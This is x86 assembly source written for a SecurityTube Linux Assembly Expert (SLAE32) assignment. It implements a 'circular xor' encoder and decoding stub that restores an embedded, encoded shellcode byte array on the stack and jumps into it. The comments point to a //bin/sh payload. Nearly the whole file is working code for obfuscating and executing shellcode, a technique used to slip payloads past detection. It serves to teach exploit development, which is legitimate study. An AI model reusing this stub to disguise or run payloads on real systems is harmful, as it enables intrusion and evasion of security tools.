; name    : circularxor-xor
; author  : Sandro "guly" Zaccarini SLAE-1037
; purpose : this code has been written for SLAE32 assignment 4
; license : CC-BY-NC-SA
; the encoder i choose is a "circular xor". given a starting value used for the first byte,
; every byte xores the one that preceeds.
; to avoid null bytes, because for example //bin/sh has two equals consecutive bytes
; that if xored will lead to 0x00, i choose to inc 0x1 every "previous byte",
; paying attention to don't have any null case (ex: 0x4142 will lead to null bytes).
;
; having 0x414345 and a starting value of 0x26 as example, we will have:
; 0x41^0x26 => 0x67
; (0x43+0x1)^0x41 => 0x05
; (0x45+0x1)^0x43 => 0x05
; my encoded shellcode will then be 0x670505
; decoding stub will xor the first byte with a known value to have the first right value
; then inc it to xor the second one, to have the right second back, and so on
;
; every shellcode will terminate with an added byte, that is the real last one inc 1 to have a 0x00 when xored.
; for example, a shellcode like 0x414345 will be writte in .data as 0x41434546
;
; please note that i don't need to make this code nullbyte proof because it will be runt just locally
; but i'm doing it 0x00 free as extra-mile

  global _start

  section .text
  _start:

; place in bl our xor starting value
mov bl,0xa1
jmp short call_decoder

  decoder:
pop esi
; al will hold current right value
mov al, byte [esi]
; xor it
xor al, bl

; make room for the shellcode, current one is like 0x1f so way more than enough to sub 0x3f
sub esp,0x3f
; move first byte to esp
mov [esp+ecx],al

  decode:
; copy current right to bl
mov bl,al
; add 1 to bl because during xor i did this
inc bl
; go to next byte
inc esi
; and add 1 to ecx to write to right position in the stack
inc ecx
; al will hold current right value
mov al, byte [esi]
; xor current with previous+1
xor al, bl
; copy the right value on the right position in the stack
mov [esp+ecx],al

; i know dl is 0x00 because nobody used it, as soon as al is 0x00 too jmp to our shellcode

cmp al,dl
je call_shellcode
jmp short decode

  call_decoder:
call decoder
Shellcode: db 0x90,0xf2,0x91,0x39,0x46,0x1f,0x43,0x1c,0x01,0x46,0x52,0x0a,0x04,0xe6,0x69,0xb4,0xd8,0x68,0xb0,0xdd,0x6b,0x52,0xba,0xc1,0x4e,0xb0,0xf2,0x71,0xb0,0xcf,0x4e,0x81

  call_shellcode:
jmp short esp

; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
